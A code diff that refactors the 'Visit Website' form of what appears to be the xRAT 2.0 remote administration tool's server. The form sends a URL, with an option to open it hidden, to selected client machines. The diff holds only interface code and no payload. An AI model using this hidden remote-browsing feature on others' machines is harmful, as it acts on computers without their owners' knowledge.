@@ -3,36 +3,30 @@ using System.Windows.Forms;
 
 namespace xServer.Forms
 {
-    public partial class frmVisitWebsite : Form
+    public partial class FrmVisitWebsite : Form
     {
-        private int selectedClients;
+        private readonly int _selectedClients;
 
-        public frmVisitWebsite(int selected)
+        public FrmVisitWebsite(int selected)
         {
-            selectedClients = selected;
+            _selectedClients = selected;
             InitializeComponent();
+        }
+
+        private void FrmVisitWebsite_Load(object sender, EventArgs e)
+        {
+            this.Text = string.Format("xRAT 2.0 - Visit Website [Selected: {0}]", _selectedClients);
+            txtURL.Text = Core.Misc.VisitWebsite.URL;
+            chkVisitHidden.Checked = Core.Misc.VisitWebsite.Hidden;
         }
 
         private void btnVisitWebsite_Click(object sender, EventArgs e)
         {
-            VisitWebsite.URL = txtURL.Text;
-            VisitWebsite.Hidden = chkVisitHidden.Checked;
+            Core.Misc.VisitWebsite.URL = txtURL.Text;
+            Core.Misc.VisitWebsite.Hidden = chkVisitHidden.Checked;
 
-            this.DialogResult = System.Windows.Forms.DialogResult.OK;
+            this.DialogResult = DialogResult.OK;
             this.Close();
         }
-
-        private void frmVisitWebsite_Load(object sender, EventArgs e)
-        {
-            this.Text = string.Format("xRAT 2.0 - Visit Website [Selected: {0}]", selectedClients);
-            txtURL.Text = VisitWebsite.URL;
-            chkVisitHidden.Checked = VisitWebsite.Hidden;
-        }
-    }
-
-    public class VisitWebsite
-    {
-        public static string URL { get; set; }
-        public static bool Hidden { get; set; }
     }
 }
